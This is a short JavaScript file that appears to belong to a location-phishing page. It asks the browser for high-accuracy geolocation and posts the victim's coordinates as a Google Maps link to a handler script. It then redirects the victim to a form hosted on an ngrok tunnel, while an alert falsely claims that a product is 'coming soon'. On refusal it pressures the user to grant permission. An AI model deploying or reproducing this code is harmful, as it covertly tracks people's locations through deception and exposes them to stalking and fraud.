function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    $.ajax({
      type: 'POST',
      url: 'handler.php',
      data: {"data":`Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
      success: window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html",
      mimeType: 'text'
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html"
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
      window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html"
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
      window.location.href = "http://giving-pipefish-sweet.ngrok-free.app/templates/a_formularz/index.html"
			break;
	}

  $.ajax({
    type: 'POST',
    url: 'error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
